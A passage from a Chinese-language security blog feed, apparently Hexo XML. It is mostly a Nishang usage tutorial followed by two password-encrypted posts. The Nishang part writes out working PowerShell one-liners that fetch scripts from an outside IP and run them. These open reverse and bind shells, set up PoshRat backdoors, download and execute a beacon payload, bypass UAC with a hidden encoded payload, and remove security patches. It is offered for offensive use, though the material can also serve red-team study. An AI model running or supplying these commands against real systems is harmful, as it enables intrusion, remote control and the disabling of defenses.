<span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Shells/Invoke-PowerShellTcp.ps1&#x27;)&quot;</span>;Invoke-PowerShellTcp -Reverse -IPAddress <span class="hljs-number">1.116.233.115</span> -Port <span class="hljs-number">3333</span><br><span class="hljs-comment">#正向</span><br><span class="hljs-attribute">nc</span> -nv <span class="hljs-number">192.168.1.1</span>  <span class="hljs-number">3333</span><br><br><span class="hljs-attribute">powershell</span> -nop -c <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Shells/Invoke-PowerShellTcp.ps1&#x27;)&quot;</span>;Invoke-PowerShellTcp  -Bind  -Port <span class="hljs-number">3333</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/0d10bf1ddf1a400b943c0a000bb2652a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><ul><li><strong>Invoke-PowershellUdp</strong></li></ul><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">正向：nc -nvu <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span> <span class="hljs-number">3333</span><br>反向:   nc -lup <span class="hljs-number">3333</span><br><br><br>powershell -nop -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Shells/Invoke-PowerShellUdp.ps1&#x27;)&quot;</span><span class="hljs-comment">;Invoke-PowerShellUdp -Reverse -IPAddress 1.116.233.115 -Port 3333</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/9c9cfaad0b6e4395a2364804e85267fe.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><ul><li><strong>Invoke-PoshRatHttp和Invoke-PoshRatHttps</strong></li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">HTTP</span>：    Invoke-PoshRatHttp  -IPAddress  <span class="hljs-number">1.116.233.115</span> -Port <span class="hljs-number">3333</span><br><span class="hljs-attribute">HTTPS</span>： Invoke-PoshRatHttps  -IPAddress <span class="hljs-number">1.116.233.115</span> -Port <span class="hljs-number">3333</span><br><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/9d4ddd4b01dc4a7098617004189405e4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><ul><li><strong>下载执行</strong><br>Download_Execute是Nishang中下载执行脚本</li></ul><p>ExetoText</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#将exe转成txt</span><br>ExetoText becone.exe  c:\becone.txt<br><br>powershell -nop -c <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Utility/ExetoText.ps1&#x27;)&quot;</span>;ExetoText D:\tool\beacon.exe  D:\becone.txt<br><span class="hljs-comment">#下载并执行</span><br>Download_Execute http:<span class="hljs-regexp">//</span><span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span>/becone.txt<br><br>powershell -nop -c <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Execution/Download_Execute.ps1&#x27;)&quot;</span>;;Download_Execute http:<span class="hljs-regexp">//</span><span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span>/becone.txt<br></code></pre></td></tr></table></figure><ul><li><strong>Bypass UAC</strong></li></ul><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">#使用sysprp方法执行默认的payload<br>Invoke-PsUACme  -Verbose    <br>#使用oobe方法并执行默认的payload<br>Invoke-PsUACme  -<span class="hljs-keyword">method</span> <span class="hljs-title function_">oobe</span> -<span class="hljs-title function_">Verbose</span><br>#使用-<span class="hljs-title function_">Payload</span>参数可以自行指定执行的<span class="hljs-title function_">payload</span><br><span class="hljs-title function_">Invoke</span>-<span class="hljs-title function_">PsUACme</span>  -<span class="hljs-title function_">method</span> <span class="hljs-title function_">oobe</span> -<span class="hljs-title function_">Payload</span> &quot;<span class="hljs-title function_">powershell</span> -<span class="hljs-title function_">windowstyle</span> <span class="hljs-title function_">hidden</span> -<span class="hljs-title function_">e</span> <span class="hljs-title function_">Your</span> <span class="hljs-title function_">EncodedPayload</span>&quot;<br><br><span class="hljs-title function_">powershell</span> -<span class="hljs-title function_">nop</span> -<span class="hljs-title function_">c</span> &quot;<span class="hljs-title function_">iex</span><span class="hljs-params">(<span class="hljs-keyword">New</span>-Object Net.WebClient)</span>.<span class="hljs-title function_">DownloadString</span><span class="hljs-params">(<span class="hljs-string">&#x27;http://1.116.233.115/nishang/Escalation/Invoke-PsUACme.ps1&#x27;</span>)</span>&quot;;Invoke-PsUACme  -Verbose    <br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/034a7e7f479449f9a575333128944d3d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><ul><li><strong>删除补丁</strong></li></ul><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-type">#</span>移除目标机器上的所有更新补丁<br><span class="hljs-built_in">Remove</span><span class="hljs-operator">-</span><span class="hljs-built_in">Update</span> <span class="hljs-built_in">All</span><br><span class="hljs-type">#</span>移除目标机器上的所有与安全相关更新<br><span class="hljs-built_in">Remove</span><span class="hljs-operator">-</span><span class="hljs-built_in">Update</span> <span class="hljs-variable">Security</span><br><span class="hljs-type">#</span>移除指定编号的更新<br><span class="hljs-built_in">Remove</span><span class="hljs-operator">-</span><span class="hljs-built_in">Update</span> <span class="hljs-variable">KB2761226</span><br><br><span class="hljs-variable">powershell</span> <span class="hljs-operator">-</span><span class="hljs-variable">nop</span> <span class="hljs-operator">-</span><span class="hljs-variable">c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Escalation/Remove-Update.ps1&#x27;)&quot;</span><span class="hljs-operator">;</span><span class="hljs-built_in">Remove</span><span class="hljs-operator">-</span><span class="hljs-built_in">Update</span> <span class="hljs-variable">KB976902</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2cb9779e2f5d4a5fa515f621762f0f20.png" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>nishang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>responder学习</title>
    <link href="/2022/06/15/responder%E5%AD%A6%E4%B9%A0/responder%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/06/15/responder%E5%AD%A6%E4%B9%A0/responder%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="6f50a36ac93b855b7f16c3fbec1092380f2a5007b8bc7b3d70c374f2f3a14173">2713301b30d54682598aa2e6ff3844e09290e4dea22feb828b8b8162666121cf3b7eac82fff6792197ca85204e76c7993d9c64897f28131ed5f8b93bbf457e76a4d5738ec641a2e0ed1c7ac980f7f6a04699464677170b1ed7ecd1c138ddf4b4a5b3c8e876071376f91866e1eb44e1f00c7082be2750d116414fe6943ec681a4c41d115c59ed056b0d5774f833831afd4947d5e8670f0d8fcce72c081421ac5f817679b83bb2a8621e6e3d6a584a1ec0e66ff7fac922d24a105d1d6213979023d6fd3afc8c343b8a281ae859b1ca407ee4b82f9123e88d37415e6959190c10c40da846b39959b4110a081d777e96a1a6c999e1dda8f2096ed5fb4894591b207f71c8a4642c985cb54a67af7636f07ca8d3bb19a16d47189d6b507e2fe3c259d48172babaee4b38aa4214e90653f7f1ec90d66fcd49e90461ebde663c2cddaab30bf34492faa2b0901b969ca02259b2e3d38a864c2f0cc6207bcaef5327232d4973082497931eea39df7ccdfc5ef2c47fa90351f0f5ba645ea88ac40887fd7ef9475f56013ba76e47830fcc96a391e2ce71ca7d0f46519d3532174370509d47e33a3c827bee75e0bca3594c517b822e7d00f9f3d6b4c5c3aadd42aacefc01831f153d295caa2c3e9e648ecb1a0da1959cd27595202b06081682237b292e757227026b5de6b83307cc2b1688026d5d8c7ada44064bafc656c5b821ce04d39de411fbeef7397f1d86832abde03462e665fb8502c3177b343827157a8ffe402a8078473bd346fa8f3e501d69b2d4a30b397a0050b861609fc55ace194a56994d79183dc6023793feb6fba8cb7054362ad98ca67534cb8b9b034baf9510e1708fe67b067c80751b07de57cbb3bc2235168f8cb32263c52373342cc07e38bfa996e852a75a7b1941a1b678f541c034b0fd156361c9c0f7d1fd0fc748d704e63a2e7891a980758f425d7f0809860eac672806b22602ebbd3fedbbc78d50ce1ea058c4922ef6269587fb1d14f4e74dc76ce900984ac4ccae801f457943e4ef2051a5229566fe2e1c8c7fbedb539ee1ff793487f79a1af06b2f34bb1d6e7ce919b6bad52fe11a966f53cb74b906a052f7e78823e5d4332cb6b95c3914051cffb4aefa83367da524bdf5643778b4e38db51001b3ad9c8cdf6f325b1b6a93c109da7f20a29d676b2a6d0ae40ae3dde2e86d5dcece69d1b511977584f50b6eeb075c05536f816943019b301ec0e977bc9f75fc5eea2d535ced3263b6ce0d3f34703286f1f467abbc46f4c643490eaecac7606e30f4ab37905844d11e83ca9f5c282d7e7e64f3563e8ae6366d998cf61cf7c4dd4c6729f367079e4eb9f430100241deb9b207c6f8dd54f8e93138a0ba7c7594c6d8573798c9b4dfbff2f9de7925e9471a50649044b24eb49367766dc1be5a123150994cef07395bcbb6be20d58ffadc715e6aaabd99dcce759f845a7aa5f80249913bbc972aac28e60407fd8584fcbb4334e8e7e0ed7e2d7dd13245d1c2d79ef1fe65d9d7412d42fbb726cdbe4d17fb8a84c043609db1bf7f5f4a31c70ed632f9e1b3b9c59c4cf36401967215fc3685e7c535232005280997ddaa66942ff85544d235a9963d8e1a5648b24a77c65d9c387436ed466602b6a2507d0462741f0818c14cc7ab194deaa5416d2d3e082a559f4fc214dc119cd1705c11e5b3c5c04a708c00b3f10e170acd1a1ed5b00e96167f466ed5a0f53feefd82d27ca780346bd11868ffc3870ecbc01088bc440ba9534e580f27c6412cd1fb5a1e272edff126e9c88828be62aa31b99178931c212a8dd7a04c9e656583da47363231edd3ab13ecff8d4ea9549a199eb2a7948d347cea1bbb5a6fd99c572dc547a54482dc715bd5ec636d20de6ad217889169d5278fbd16fec07d64a125757f72a53dce0d42ffb6ab2b8d6f452055b71f60110f44b2d59acc58bbcfd72b6eea6b82b5e6bf8f47bc7ada06bfd1af52c398b9e10bccaa08c7dc24985449ba669be797a0145066a5bb08a5be50e269f4b11c07f2dcd4b53fec3bb2e94a4abeedb3923e05ad8934528b0dc79380465ed88f31ae4d6ed8662da2704e10fe92c6ec8b78a8880f7a4ca0be716b940ba12475c7c731bace61d583c11f8d50a4fb27ece32c1267ad66b20f705870e1eb4855f27f561b0ea823f33a2283aebe4e73cf96a39fbea552407c238f182aa5e3617665232c982fb30658bbc2f0f8a6a08ebaafcb8bf8ec5fb4dc6cc68409da78f04247d241fe70314690ba3b2013298e82a4b3db5f9ae0861867ff1919c2eb42628c4f188a2801d8f22048e0405671662812053807ca52b6f3fb4586c7d29c9e9cc46f7ae601445581f6f873bcc3e5eec027edaaa76ea04c29c0f767a123be876be05dd097faca663332b1dad286791bc8c542d28ce7648588ace37fbf76fe28df67807a846d3a92b49655e820cb6a8a296ff2fc5b9b9ebbfef9610a08038f3c508df4a49a1edd2d195b2835cbb45aa6a16860761ea36d6b7d8d3015095f15c340ce2ae97ce400c72e8b31304657c5b756cb18428f8fe16d86143ca405780ab9d0e763089a5a5cbdeb7c07f8a828457ea2fbe101bf14b4de0c9a066506a60e8fbc35413439cbb25f0b4e701baea20ae4078e37af6697578e6a968a649f29b562deed25b7c273869619e8c3902a0a82393e8c8965d0c47c3a241d8537806ead0e488e9bd5bb20352eb79fad6fb4123bb9f8b216ab6622cc40e82c5b64d2d058149a1baa0b53fbbe194ea3fa408c61c07f2cfb957ea725f8a6f856782c8d0466c4d81a9c93d7bbf9a4d05af92073e2b2e891fd269d445fc22e703c1458288e1bc41550d6ea3606683fc478db9d981aa845ed8986b7237748b2a63ce7ed130d7014c43dd2badc1ab7f3d7003e90efa8d6eda590f9c807a1442993ef4b14713c0498e2fde7f6ae1c845a6f0644704b10f12cd8f2220d3f97cf88ddcefe3020aaba9fc06d1e00acc68b9ecb366a55cb5e47271841dfb8bd30ce1539e7acc435e0deb37e03a8b2abdc05c391dc61d308b2cfc4536545c749581ce3b166a3bfa7d486d50ca275e34918e063eceb36cb8637d20b2956c9196e63f84dbbb3ea8e0fa6d8868eb3eea378b2beb531246de3b7d8e8e213c4fecf4d8f915f312773e5a11e69662675095163d49fb598cbc0dd927e67397e2ee476aa4eb05cebe52f47b32fe93e173bd731db40b366d1c5c2bd2bcb86367284626b0e07cf7f6696b05257189ba989df080488aad8e10b27b18065617ca2edc3acd4369f23ab8401ab22ba556c79a2dcfd8e7ec6149f5d5c5d8abf64da497eb8d1c91d3a13957c4963fb40d0e904f92bd7afd9c7450caee2d36dff86923b7559df0721562f2316db3e5a70f405a34b7a47c8c4ef1f8ebebc4e9ba6cd7ad54ca913d73dd4c54bfb92a748a33020239f1bfb20554e694a1b6b9d97e9ff9c20f5bf07fac4efc61a10efd5861e92a62f4a839df5bbe0df04940c8e85f8e70f1a494652e67cd28670d6cb22366e4830f6062baf21b0ffb443082f3f7a83670ba2d0e94eafc432a7924d68fc89fd12c1478d992f6b760e901b862faafa5fe6bfd3b5c7aad5e8551d04f4604c37279e7e5f1b8c8febaa4594642827dd7326b138f4fd5cdbf9bddc1dcaec885f786d82e8c546b253a0e1058c7b447b2ab6ffca4649acc7c08f7358a1022bec462d239dac780e564466c752d0bf3c9d4c45150d41d9b3dd46d926eee9f43a3d67528d80b9811810382406c50d7cdc9c3743e4991a5471a6517089e3e88023d3b050902a913f5633f20c58da1ab35248feb425ffea0d7c50ff2d93122d296f4e85e4fa1601dfd3b7a9ff7627fd788059ad19a04367588cb9aad35bedeb1b64f1da04d5522a887c11e10f9719fdd1f1f59f80db3882f22f56e62ce081ee2fa27bb7386d38d317c07273b146186994a33c9ad5e01e5d025938d4bc65178e0cb7003f2cf944cc6d588d8c2d895bbbdc263be1cf8e6b56fd79690fa0ac34fef0ad3cb42dc34a5b5a585cf792f51693b0e83211b4756131a6d37494b8ba6d980899009854b4b0bc7c2b00f7229d1c918f20d224e58d0a2fc08808f02301bd14e43059c4c72d66b0f2140170b6da3a0e892c4b76ec89f6345c56f2bf6af16fd5557b6a4a5c9e2b5abee8f5afe7a6687c0221075b0b6e2fea1876c78754ccd84f0905ef2a76751d24145e0946399b90cb6ce368800bd2be5380f64abd6fd3aafab16bbd35dd70e59b97d30c91819c8a0e57304c43ef7cdd598ea41577b9251682f4be03935949c2f583a82ca98a66263dbcb12528c17eab332777ebd022ee7cc7151a9c0591ed24edaf73359514a35f42e4d2284269c383b765ea4b964c6222e02c51cf71918c5a1a039b8d5f16e72685220317eb450dd317cca37493808a1c0c5451a40aa1dc2bccc3a12ec1939af93a4ebcc1d02fd4bb3870f513a9bcc0123a098c24d3150f3467de6fd3691ce7d924d9afdc3c3ee5bd259a9c5cf485e51a22fdcd8978df66acaa1503ac79a7e2dc06fad1f36f0fcc87f82b1bbc306270313a04ccd431fa70ddd0d95280bb6293fed0f058dce3125b6bd34cd5d00e07a5f41abc61362504e560b7a801bf0dc1f507ba557c88bb345559bce66784f200e018556837e75871f8f29b0d950af6c15f354b0ab5a356ea09712962965d9c47055417a863b0e738ec22f86a5ed2f3aaadb7313f9d84b277853c204a4c4c2c509d282bd20c43ee3ac2d970389a005fed303580536fa5afc9fb838902a2430033c5b097fc31b14f9b0bc59837a0349878877b25ac3c933f43bfcc41fbee7d7b4baf1037f13f8e29aefb2f99eb768ccb82eb39b9bf8d4047194ca45416a5545be0883303647fff7fce1a8e7d40ddb6b0e013170a40be0c1df734c591c6ca12229bf17255b22d99e6703f34076c77fa54d89ec5b2000323e355dae78a832d6cb0a5f24c7c89eb84a7df188d2c4cb13eccd615a72e309b9365790425a76de3304b9f821aa265d629961eaa96f47e4710c1807fc4c0e867cd0a81975c2f672d8a93bd1e1222a07461905cdf16b977d6b6daed022848d87d8c97d055ddefc6d5d896f3f005b17f6356f947f8ae4c09941b8e7878be35baa1e47e254cccd13e0ee18bcc33d79a31a0739c5b2ac13d9c525000ded4d2d985133a2d3d47cb01191437b267006a7273df6cad60f15f6064882eeaf4365a1fb1a3043a01c3be8015c470b8515fa8a1343ebc2ca7da8acb8454cc249eddd46ad2d54a251e48b483cc13fe014c8680e275c2dc1de9fc68c021520f8638d4774fd08001938d023386875f62d05daad1a1cae59d84a2c2ca76862e4edb8828239f74c688ccdb1a77f405f813d1ecc283b383ca58a7a69988d28f96e552bc1a7bf7d1db950418b2c5399b6d1b4773fb25c90afbe0d03854ec9186ddd0552af68abfeb8dd348a08a2a6883736039ebe8d57606da021d72398fc6f90da2c1176c14f98d0ef15b1160124acf6e4c8c25cb0af624f01e191093ae644949f7e8d6e05739a95c9f1b2371ef0de3040d1ca781d7b71e618e39bfe47637a30ca6e9c832bb888e4370750dc8a80283352a2ad0e049960e520dac1e80a550b605de8f95beb341e15012de2dcf83b671784780cf23d7b313ad6d9737ac01f50b5c9f70e76bb1d457abb0c80ffc98a27e7b3777863e665754e817bcd40c7282a95cd06709150181739825897af3b1981d9dd0e52a330f95fbb3f21aedfe39d1c52663c4ff73346c1b3cc7a79e7fd247d01d867cb6057f2dd74eb617fe5200d8202e6995fe7dd8c36b2cdcc238b37bce112889bdf6d123f7c85c95095cdb4c60b96a8d108055c6ba70a925861f053de3209088d36d484adee12c2ebc07ca87fd73b882f25e914db3adebc8eeb3ddc5ddd23e17c3a7c1cecb28ad097dd6d4469a5457e752f5595ed60382dd183d038c352fea18d1cfaa89eee64318cc0807d86d80f0738c13dbcd059b74903a11f1a55c84ab106d3b829c3e84480eb7a51ccaf7519afb014ff2b4737088a8cf059dedfad465d893a0167fac04a960a28dcc340c76cb2cdf98191f5e4fa61cca1d488b0ad6f01187da8ac709702db64a100fb8ff33a7613fe4c187ee2c320cdf64388388b891560697f51a6b7032d7482a4e2ab2f3bb04ac8b04888a99f618bd94b51dae97e18e6a02c870276e28d06ebf3f00660915f342fcda1d076626959d9cd0cfb9932a4d6403ca652db2cf2ad37e2f5fc466b0db4f1368b01f67b23e05ea6a59dcdc480ad0b86605dec63f08c53e5f735ab7321395e0634dab1f4faf6da6b5433b56ce81c120b2821f82ed33f30db584248b99f7f8aeecf73c8b3868bd5b62a62b150a07bbb71c2411669bc7e82c2d0b2346f4b3dda3d909da7e7ffee1b23a9122c01eb4f9583001573e4945784dfa40b2fcc021b0763b1b0438df248dcd84f30c9b7e0eb234cfeff13be953d5db0aad9e9d685833669099d5860316c5f89ef270661028cd05840ec1d18c455a24736df89f48b03d90c38dd203b6a30f13d1ddc3814fceb297b057308b86034d795782a1def8d98be8cfa67abd65db44846fcde077b83998a275f1e5b65cd0e555be2f0da26a7dfb2c02af0b0c1a7c4958e38d8c3ce00a4ba9fe925a1e7fa84f1d7f717b76e195c3618bee521970a15ec81aa72c16005d7f8ddc8a7c74179749ff3f22a18e0df2ab2888774f08a83f0489971ece4d96b8793a6f5ae19e5685cd4cc02503a38f31cbb0b3fcb9cae7d4ece12ae14986f90b0bc0649918731a0df691ac9e0362796b6e89e562f15f015de84e23f7d23e60c4476dac78987ec76333ed8cd334fcd9c458fa377a8e01c19f33e92cfa35ab5f4775e6dd648856cb4113cc437d4a4b63aeef3195614693fd33a8e9f8613db3762c520b7440fae2b4052ee89f816fe67e4c05b2afe517a82ed3e116c21728934516ee0421eb0f946b67c6b0ad17300ff6101e4bb93f1e43d61bce0a484593096e078a85183704529feccbe8ec7467e7387d41532cfcf28c4e656c6c5323b1d3924a1ea6b803286cacbbd0cad63bbc867cc36eea7e1ee5b07c0061c4a225d37c55cde2a92710c097210840105695835a119e11a899c86a970feaeeebc5427dd318657c962db9e39481b22f8fc6af0a46e50bc5fbfe411900e6e8ae9c693053c5b103598116f06e61a3b9cb750ae9d9f49a73b4b43361d811147d66426598b395596db5eaa55aede5f8d9796b89184005000ea436ff61b7213c55bd7d1c7bf28bedf0953bf1eee24232593d30890d7d7dd02057f14be9153504e93b0cd2050b98c703a3a6692b134705b1c565fef79ad9c59ba4a3e93f46a868e108dfb56f84f9ab66ad5c946a1575945824d0e7aab520575bde786393e885e9aa3bdf975d408f53a349460ae5c72f85e9b7979faf9bb7deed83574a2ae78fa9269689af1dcb143baddbca72f6a6940c648fb9cbf4fc0b9be5a3686d2d3218b863726e95a53fe46aa30eedd958f4c0f39a36c2e5cba066abfa191f32cd18b2147ce13c01bdc78e96057c755faf5dc48f878f4b22a5f94f4f38c6c3748a017939eedaa73ff87d6f813cb4a9cb68ee302c35c6b28b4ff8636f6aa122ee7c7216576932d371b746094912e6d7d12821e373e45d3a7f01d01880e23bf39939c4e75d6c4b4bf265e5e8b4d460c20ef8e45d686ef4521e3646b5214993cfe3daaf827d4280301f4860790d085e424dade3b50d3a5265b6c881e07a449a230396f29baa6772b5e963ad369ac3446d2d8defd86d956d0374a7386cfea0e3c8ffa1f371eecec2ee37a3b86a5e7e5543cf584c86bcef142362e4b9926e5e1385df22929708ea23df7fd4b98ecf032819df52f27fbfc201fc84a810c55bf4a39ad5fdac1bb3e6e0afbd348d2ac87767d80a093d50f8b3166ef7715a7b8b39f7f15a2c941e406903b7e1de77677349ff016a9124187192ed179fdb74bdafcbe2824a77ca0926345ac60e592447d8c877d6f8730887a8693db726b846aaba2fa9d2f919c83cf620a3eb7865b0345a43774db17ea6114f23fe2f5ab983801d349413069aaf0cd7ded7dbba0b177b69d183f22fe0241da1f6c1bbf59699a563eaa9a5a66c0fb470c4c19657d4c3</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>idea</tag>
      
      <tag>responder</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CrackMapExec使用</title>
    <link href="/2022/06/15/CrackMapExec%E4%BD%BF%E7%94%A8/CrackMapExec/"/>
    <url>/2022/06/15/CrackMapExec%E4%BD%BF%E7%94%A8/CrackMapExec/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="c7dad487946db30385888a8d40d6ed431e9a13ba92c9f1d0a0df425e6e8a3eff">2713301b30d54682598aa2e6ff3844e0603d55e84dcc90965df98be1c5d53af3e0a1e88672c7b78275fd55dfbedc55dac9d9c4e5e52d6221b01482b382785133ed6a5c0a95a6d25ff091c774770a361e6952039faaffbbedeecdf0544f466c61478ebf99b346e2482567302c6dbe7d34a3864ade370da66e5fa5eb50dd24481091a0f626aa7384b57bef2a596b30b8b9c624e1280c4a1abade119a036678a8993e278adad5a1505592c3c27be715d4e3c22fe4bd62f4ef6a4801f59c9fc02c5b95ed7578164463af63d32d6ae59d1336f19954d35ae7ae0f8b2bda0afd5cab03093fe3f9eb6f9a9972cdb7e798696dcba9ff60d71e6591c758ff1ecd90354911ea32b30438e0f89e4dc8a4ee63b428cd09d3c166128738844b58f4515266b3e77c8d07bc596a577496f6897c02443b687881d51ee807f8a89958ce7b256bde3590f115eed8e736a8de7ef1b31c4f91d2be194898be21e93a327e18c8ddb4f3a0e440988fc3f6272bc9d7dbad1b159b3747480c84670cd0155625b621b70c92e89580fefdf9b4ee8e622727e1f635439b7166beedf5ca882b83847c01ba644ce78a1aff1bdf783f5fb126a0547542f3393a9fd8fb84a47be97b7887c8f47d64f73c8ce4e34663a534637bfe9cd61753f7657c70e764a71530244bcd3744b6db3e53a14537eeed7bd74da477d816517c773973b410e0627d7fc5b1f399efcae26f452d611e95a05c7ba919beddde2048ceeb7b483d97cd43764008899c8baffb7a804d451bb7b010343d1ee070b5ad05a94b28e0423b451abf11bdece41e0d6a70cfe4eed555c395aa4d2ff34f56f4132cc1d6ea5a61716a7fe77d48944985771a79e0a0b0cc22693329eaeced5cf6e9cabd013c06e66a028d876da180581bce2fd2768164d1c75483433a0a1cfd99e24da5b9b74426aa1c9b2f131c96f86298331a2dfae0cf8e2303ea4d56b3754b91c8d9deba08488ea1da88bab7a603345c81ef401578c22cf86895ec5b5904c52b9d24426ca0a2963fb6bd5c291e24e28e3ee91bf8a53c40f0874c84140f8368fab9e283bcfb33b2c25a789337da29a8525ec4c65ca70e391298d8a7e70790c503f8763f863546623bcbba79843eb8f7f93a44da14e57a20aca827bbc25724cffedf240353280830c587a42f3fd042a2798f55670258d5755f9c691cc864488191b37bd9e9136afd472788b765e74d84d6becd82eefd3726cdfc954d4397cea0d717929c84562aca5b0108bad1f01371cbc04b0836630879be044e512445f88a241819a997549b9a5a32c4f1e61e62c62cb5481ec6e90390cd8aa3d4c5f988820ed1c5da83fb60ac3dca9cd23bf987d1a7b2662f036b91a24efe4cbe0535153d18a6b0059ead6b03eec4edd9d3463f7670ee933a2fd9a9eb211a1a817366d5aaa927bdc788690c64662761ff9e9507af4fed41020dff69b6202c9f4bcccda1c3d4033cb8c3d1590aa73838b36bd82891e62d8e394f73dd168ecb93e88b4cbc30bca0e27e7ba0767c2d6adc61e0e80141cec033b575a03d8eee9a1ab59b5e7a14cfdb63468b2a3ee8d7c6ab4e41c4289c0aed7fa5dd1ea0c993f38381fe46a44d1f406b724b36f59c29a6b4aaaff9a6bdbf45a83cd63355484ab01434e29cba1bb73d6dd76606fa8aef18599419db3838a40325b7b247dcf6f76c951026e5a470678916a0b4679bcbf8e11be8b395f0930b9b15b06ee160362ee426e437aa9760beef599cefdbea3763821925d33af3b6d60e4933efe1eaaa272337abb04059832b3f0b128ef833ad432eaba4f9c7770dbabe9fa2ef376eaeafd466e524dfc1b946d96bd77ea321702bc0b936974db8b7e44ad864109debb6b4842febcf213069d4af8e4d4e75aa4cc823693d231915507083bad23e9dbc8ae183e41b016d6b2195586569a1a999ad269374197bb0743cc966b0af44dd1ce9ba7fc9edb6eda3c3d055ac2e90cf25512f7739b8bfd6141d030285b212c1a2ca90488f11e29567abe933f714b472cd6cd971cf709dc683eff7148d264f712976198ce9bb5a5d87473c31c1c7fc507f13c266ef1ca3964e941ba86c7a7746fe9bb893ed90dea4bc5bab54752f43d1dd28ad639f966d05d7b839db9519fa1b6c2ed3c5aedfd93545557dbee838aa76c5a13328cfb62e5b4d81b8d6a1658bd3fa65b4e55ecc995e26699e5a65a7c4e5ca1a584e464c2771ee87fd1133ac11634a63a59325ef55f4c0ea343e9f4416dcf032dbb8eeb99b4597081c39276b593cf21920368820ed8416a08dad3b62f2c76a04a1588280ddd7de81ea41b7fd00c687653bb7d350f797472a1d4b2ee4a9b8f20a2dbbe209a4ba051b4b855f1484371d92ea810406b622f0eb7eea161987fed8565ab315823c5e72c37dd64668370caea18fb4d6884633100589879ddcf8cce9b8e24a24840754e03ee44418dc44da3c2a69d64120a368433a3ce4c1d2740adfd460f8d65d45143d517c82c0e929d3247c5d5e889670036a745d04b6ab79bc44af5b988eb9b22926935ca7beaffad3d890cfd8ac8150b662692b30a231a05ba09ced99162ac5ace56da516a70552835db1cf1f105693fe2b43fc87277d746d54af43f2973c9ab07c2ea05744a17643ba31d3fc6330a6421044964dd7a67b6c671d7822acdffabdc2e3cfe1c8bc3a7da14b91b7f2a8385796